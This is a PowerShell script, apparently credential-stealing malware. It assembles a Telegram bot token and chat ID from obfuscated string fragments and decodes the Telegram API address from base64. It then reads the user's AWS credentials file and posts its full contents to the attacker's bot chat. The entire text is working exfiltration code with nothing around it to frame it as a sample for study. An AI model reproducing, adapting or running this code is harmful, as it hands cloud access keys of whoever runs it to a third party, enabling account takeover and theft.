$wzy = "59";$tt = "58";$hes = "38";$123 = "37";$x4 = "10";$ty = ":";$gg = "AA";$ls = "GV";$hf = "Sw";$whoami = "vG";$whoareu = "fI";$potat = "RF";$xaxa = "YH";$yel = "Mq";$ydidu = "E0";$lol = "5x";$brb = "lC";$afk = "NI";$xor = "xz";$2s = "C-";$sha420 = "5O";$base58 = "Rp";$pythagoras = "Bo";$charles = "I"

$temp = $wzy + $tt + $hes + $123 + $x4 + $ty + $gg + $ls + $hf + $whoami + $whoareu + $potat + $xaxa + $yel + $ydidu + $lol + $brb + $afk + $xor + $2s + $sha420 + $base58 + $pythagoras + $charles

$__ox = "604"
$__cx = "972"
$__fx = "174"
$nsa842jf2 = $__cx + $__fx + $__ox

$__path_frag = ".aws\credentials"
$w26zxa842 = Get-Content (Join-Path $env:USERPROFILE $__path_frag) -Raw

$__tapi = [Text.Encoding]::ASCII.GetString([Convert]::FromBase64String("aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=="))

$24t8veb = $__tapi + $temp + "/sendMessage"

Invoke-RestMethod -Uri $24t8veb -Method Post -Body @{ chat_id = $nsa842jf2; text = $w26zxa842 }
